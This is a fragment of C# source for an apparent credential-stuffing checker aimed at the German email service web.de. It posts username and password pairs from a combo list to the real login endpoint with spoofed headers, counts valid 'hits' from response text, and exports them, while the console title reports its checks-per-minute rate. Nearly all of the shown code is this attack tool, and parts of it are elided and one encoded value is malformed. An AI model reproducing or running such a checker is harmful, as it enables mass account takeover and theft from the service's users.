            ...
            try
            {
                ...
                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        ...
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - Web.de] | Hits: " + Variables.hit + " | Bads: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });
                    ...
                    try
                    {
                        ...
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            ...
                            try
                            {
                                ...
                                httpRequest.AddHeader("origin", "https://web.de");
                                httpRequest.AddHeader("referer", "https://web.de/");

                                var res0 = httpRequest.Post("https://login.web.de/login", "server=https%3A%2F%2Ffreemail.web.de&service=freemail&loginErrorURL=https%3%2F%2Fbap.navigator.web.de%2Floginerror&successURL=https%3A%2F%2Fbap.navigator.web.de%2Flogin&statistics=&loginFailedURL=https%3A%2F%2Fweb.de%2Flogoutlounge%2Ffm%3Fstatus%3Dlogin-failed%26site%3Dwebde%26agofid%3D97_L%26pg%3Dnull%26pa%3D-1%26pp%3D___NULL&ibaInfo=os%3D17%3Bbrowser%3D11%3Bdeviceclass%3Db%3Babd%3Dfalse%3Bweather_temp%3D14%3Bweather_condition%3D5&uinguserid=0a4a320d-143-1601931666-0&tpidHash=&salt=username=" + s[0] + "&password=" + s[1] + "", "application/x-www-form-urlencoded");
                                string text0 = res0.ToString();

                                if (text0.Contains("Ihre Browsereinstellungen lassen keine Cookies"))
                                {
                                    Export.AsResult(Variables.hit.ToString(), "MODULENAMEHERE_hits");
                                    Variables.hit++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                ...
                                else if (text0.Contains("Login leider nicht erfolgreich")) 
                                {
                                    Variables.bad++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
